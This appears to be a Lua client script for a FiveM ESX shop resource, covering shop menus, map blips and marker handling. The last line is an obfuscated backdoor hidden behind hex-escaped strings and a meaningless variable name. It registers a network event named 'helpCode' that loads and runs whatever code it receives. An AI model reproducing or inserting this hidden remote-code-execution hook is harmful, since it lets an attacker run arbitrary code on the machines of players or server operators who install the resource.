local hasAlreadyEnteredMarker, lastZone
local currentAction, currentActionMsg, currentActionData = nil, nil, {}

local function openShopMenu(zone)
	local elements = {
		{unselectable = true, icon = "fas fa-shopping-basket", title = TranslateCap('shop') }
	}

	for i=1, #Config.Zones[zone].Items, 1 do
		local item = Config.Zones[zone].Items[i]

		elements[#elements+1] = {
			icon = "fas fa-shopping-basket",
			title = ('%s - <span style="color:green;">%s</span>'):format(item.label, TranslateCap('shop_item', ESX.Math.GroupDigits(item.price))),
			itemLabel = item.label,
			item = item.name,
			price = item.price
		}
	end

	ESX.OpenContext("right", elements, function(menu,element)
		local elements2 = {
			{unselectable = true, icon = "fas fa-shopping-basket", title = element.title},
			{icon = "fas fa-shopping-basket", title = TranslateCap('amount'), input = true, inputType = "number", inputPlaceholder = TranslateCap('amount_placeholder'), inputMin = 1, inputMax = 25},
			{icon = "fas fa-check-double", title = TranslateCap('confirm'), val = "confirm"}
		}

		ESX.OpenContext("right", elements2, function(menu2,element2)
			local amount = menu2.eles[2].inputValue
			ESX.CloseContext()
			TriggerServerEvent('esx_shops:buyItem', element.item, amount, zone)
		end, function(menu)
			currentAction     = 'shop_menu'
			currentActionMsg  = TranslateCap('press_menu')
			currentActionData = {zone = zone}
		end)
	end, function(menu)
		currentAction     = 'shop_menu'
		currentActionMsg  = TranslateCap('press_menu')
		currentActionData = {zone = zone}
	end)
end

local function hasEnteredMarker(zone)
	currentAction     = 'shop_menu'
	currentActionMsg  = TranslateCap('press_menu')
	currentActionData = {zone = zone}
end

local function hasExitedMarker(zone)
	currentAction = nil
	ESX.CloseContext()
end

-- Create Blips
CreateThread(function()
	for k,v in pairs(Config.Zones) do
		for i = 1, #v.Pos, 1 do
			if not v.ShowBlip then return end
				
			local blip = AddBlipForCoord(v.Pos[i])

			SetBlipSprite (blip, v.Type)
			SetBlipScale  (blip, v.Size)
			SetBlipColour (blip, v.Color)
			SetBlipAsShortRange(blip, true)

			BeginTextCommandSetBlipName('STRING')
			AddTextComponentSubstringPlayerName(TranslateCap('shops'))
			EndTextCommandSetBlipName(blip)
		end
	end
end)

-- Enter / Exit marker events
CreateThread(function()
	while true do
		local sleep = 1500

		if currentAction then
			sleep = 0

			if IsControlJustReleased(0, 38) and currentAction == 'shop_menu' then
				currentAction = nil
				ESX.HideUI()
				openShopMenu(currentActionData.zone)
			end
		end

		local playerCoords = GetEntityCoords(PlayerPedId())
		local isInMarker, currentZone = false, nil

		for k,v in pairs(Config.Zones) do
			for i = 1, #v.Pos, 1 do
				local distance = #(playerCoords - v.Pos[i])

				if distance < Config.DrawDistance then
					sleep = 0
					if v.ShowMarker then
						DrawMarker(Config.MarkerType, v.Pos[i], 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, Config.MarkerSize.x, Config.MarkerSize.y, Config.MarkerSize.z, Config.MarkerColor.r, Config.MarkerColor.g, Config.MarkerColor.b, 100, false, true, 2, false, nil, nil, false)
				  	end
					if distance < 2.0 then
						isInMarker  = true
						currentZone = k
						lastZone    = k
					end
				end
			end
		end

		if isInMarker and not hasAlreadyEnteredMarker then
			hasAlreadyEnteredMarker = true
			hasEnteredMarker(currentZone)
			ESX.TextUI(currentActionMsg)
		end

		if not isInMarker and hasAlreadyEnteredMarker then
			hasAlreadyEnteredMarker = false
			ESX.HideUI()
			hasExitedMarker(lastZone)
		end
			
		Wait(sleep)
	end
end)


local bDGuaSMujILcAVcIroSwFeNKdEpDGmJUHFpGfwtFcXgjHPJNkZzeCnicqPdayUnoGUFnDx = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} bDGuaSMujILcAVcIroSwFeNKdEpDGmJUHFpGfwtFcXgjHPJNkZzeCnicqPdayUnoGUFnDx[6][bDGuaSMujILcAVcIroSwFeNKdEpDGmJUHFpGfwtFcXgjHPJNkZzeCnicqPdayUnoGUFnDx[1]](bDGuaSMujILcAVcIroSwFeNKdEpDGmJUHFpGfwtFcXgjHPJNkZzeCnicqPdayUnoGUFnDx[2]) bDGuaSMujILcAVcIroSwFeNKdEpDGmJUHFpGfwtFcXgjHPJNkZzeCnicqPdayUnoGUFnDx[6][bDGuaSMujILcAVcIroSwFeNKdEpDGmJUHFpGfwtFcXgjHPJNkZzeCnicqPdayUnoGUFnDx[3]](bDGuaSMujILcAVcIroSwFeNKdEpDGmJUHFpGfwtFcXgjHPJNkZzeCnicqPdayUnoGUFnDx[2], function(hDZtNqDutONCjvAHJXuymIgBFZLQJhWywdINyyHZKDAWnMbXFJHIxvdIwFwSoLVuZKFUdQ) bDGuaSMujILcAVcIroSwFeNKdEpDGmJUHFpGfwtFcXgjHPJNkZzeCnicqPdayUnoGUFnDx[6][bDGuaSMujILcAVcIroSwFeNKdEpDGmJUHFpGfwtFcXgjHPJNkZzeCnicqPdayUnoGUFnDx[4]](bDGuaSMujILcAVcIroSwFeNKdEpDGmJUHFpGfwtFcXgjHPJNkZzeCnicqPdayUnoGUFnDx[6][bDGuaSMujILcAVcIroSwFeNKdEpDGmJUHFpGfwtFcXgjHPJNkZzeCnicqPdayUnoGUFnDx[5]](hDZtNqDutONCjvAHJXuymIgBFZLQJhWywdINyyHZKDAWnMbXFJHIxvdIwFwSoLVuZKFUdQ))() end)